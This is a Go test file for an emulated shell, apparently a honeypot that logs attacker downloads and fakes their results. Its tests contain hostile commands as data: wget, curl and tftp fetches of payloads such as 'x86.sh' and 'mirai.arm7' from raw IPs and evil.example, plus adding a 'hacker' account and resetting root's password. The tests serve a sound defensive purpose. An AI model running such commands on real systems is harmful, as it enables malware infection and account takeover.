package shell

import (
	"strings"
	"testing"
)

func TestWgetRecordsAndDrops(t *testing.T) {
	in, s := testSession(t)
	var got []Download
	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
	run(t, in, s, "cd /tmp")
	out, _, st := run(t, in, s, "wget http://185.246.0.1/bins/x86.sh")
	if st != 0 {
		t.Fatalf("wget status %d", st)
	}
	if !strings.Contains(out, "200 OK") || !strings.Contains(out, "saved") {
		t.Errorf("wget output = %q", out)
	}
	if len(got) != 1 || got[0].URL != "http://185.246.0.1/bins/x86.sh" || got[0].Tool != "wget" {
		t.Fatalf("download = %+v", got)
	}
	// The payload file exists with the URL's basename and is executable-able.
	if !s.FS.Exists("/tmp/x86.sh") {
		t.Fatalf("payload not dropped; saved as %q", got[0].SavedAs)
	}
	data, _, _ := s.FS.ReadFile("/tmp/x86.sh")
	if len(data) == 0 || string(data[:4]) != "\x7fELF" {
		t.Errorf("payload content unexpected")
	}
	// Later commands see it.
	out, _, _ = run(t, in, s, "ls -la /tmp/x86.sh")
	if !strings.Contains(out, "x86.sh") {
		t.Errorf("ls of payload = %q", out)
	}
	// chmod +x then "run" it -> exec format error (never really executed).
	run(t, in, s, "chmod +x /tmp/x86.sh")
	_, errb, code := run(t, in, s, "/tmp/x86.sh")
	if code != 126 || !strings.Contains(errb, "Exec format error") {
		t.Errorf("running payload = %q %d", errb, code)
	}
}

func TestWgetOutputFlag(t *testing.T) {
	in, s := testSession(t)
	var got []Download
	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
	run(t, in, s, "cd /tmp")
	run(t, in, s, "wget -q -O malware http://evil.example/payload")
	if !s.FS.Exists("/tmp/malware") {
		t.Fatal("wget -O target not created")
	}
	if got[0].SavedAs != "/tmp/malware" {
		t.Errorf("saved as %q", got[0].SavedAs)
	}
}

func TestCurlPipeAndRecord(t *testing.T) {
	in, s := testSession(t)
	var got []Download
	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
	// The classic curl | sh.
	out, _, _ := run(t, in, s, "curl -s http://192.168.1.1/setup.sh")
	if len(got) != 1 || got[0].Tool != "curl" {
		t.Fatalf("curl record = %+v", got)
	}
	_ = out
	// curl -O saves a file.
	run(t, in, s, "cd /tmp")
	run(t, in, s, "curl -O http://192.168.1.1/mirai.arm7")
	if !s.FS.Exists("/tmp/mirai.arm7") {
		t.Error("curl -O did not save")
	}
	// curl -I prints headers.
	out, _, _ = run(t, in, s, "curl -I http://x.example/")
	if !strings.Contains(out, "HTTP/1.1 200 OK") {
		t.Errorf("curl -I = %q", out)
	}
}

func TestTftpFtpget(t *testing.T) {
	in, s := testSession(t)
	var got []Download
	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
	run(t, in, s, "cd /tmp")
	run(t, in, s, "tftp -g -r payload.bin 185.100.87.1")
	if len(got) != 1 || got[0].Tool != "tftp" || !strings.Contains(got[0].URL, "payload.bin") {
		t.Fatalf("tftp = %+v", got)
	}
	if !s.FS.Exists("/tmp/payload.bin") {
		t.Error("tftp payload not dropped")
	}
}

func TestNetworkInfo(t *testing.T) {
	in, s := testSession(t)
	out, _, _ := run(t, in, s, "ifconfig")
	if !strings.Contains(out, "10.20.30.41") || !strings.Contains(out, "52:54:00:6b:3c:58") || !strings.Contains(out, "eth0") {
		t.Errorf("ifconfig = %q", out[:min2(len(out), 300)])
	}
	out, _, _ = run(t, in, s, "ip addr")
	if !strings.Contains(out, "inet 10.20.30.41/24") || !strings.Contains(out, "eth0") {
		t.Errorf("ip addr = %q", out[:min2(len(out), 300)])
	}
	out, _, _ = run(t, in, s, "netstat -tulpn")
	if !strings.Contains(out, "0.0.0.0:22") || !strings.Contains(out, "sshd") || !strings.Contains(out, "LISTEN") {
		t.Errorf("netstat = %q", out[:min2(len(out), 400)])
	}
	out, _, _ = run(t, in, s, "ss -tln")
	if !strings.Contains(out, ":443") {
		t.Errorf("ss = %q", out)
	}
	out, _, _ = run(t, in, s, "ping -c 4 8.8.8.8")
	if !strings.Contains(out, "bytes from") || !strings.Contains(out, "packet loss") {
		t.Errorf("ping = %q", out)
	}
}

func TestAccountCommands(t *testing.T) {
	in, s := testSession(t)
	// root can add users (silently succeeds).
	if _, _, st := run(t, in, s, "useradd -m -s /bin/bash hacker"); st != 0 {
		t.Errorf("root useradd status %d", st)
	}
	// chpasswd consumes root:newpass and succeeds.
	if _, _, st := run(t, in, s, "echo 'root:newpassword123' | chpasswd"); st != 0 {
		t.Errorf("chpasswd status %d", st)
	}
	// non-root useradd is refused.
	as := NewSession(s.Machine, "martin", 8)
	if _, _, st := run(t, in, as, "useradd bad"); st == 0 {
		t.Error("non-root useradd should fail")
	}
	// getent passwd root returns the root line.
	out, _, st := run(t, in, s, "getent passwd root")
	if st != 0 || !strings.Contains(out, "root:x:0:0:") {
		t.Errorf("getent = %q %d", out, st)
	}
	// getent passwd nosuchuser returns nothing, status 2.
	if _, _, st := run(t, in, s, "getent passwd nosuchuser"); st != 2 {
		t.Errorf("getent missing status = %d", st)
	}
}
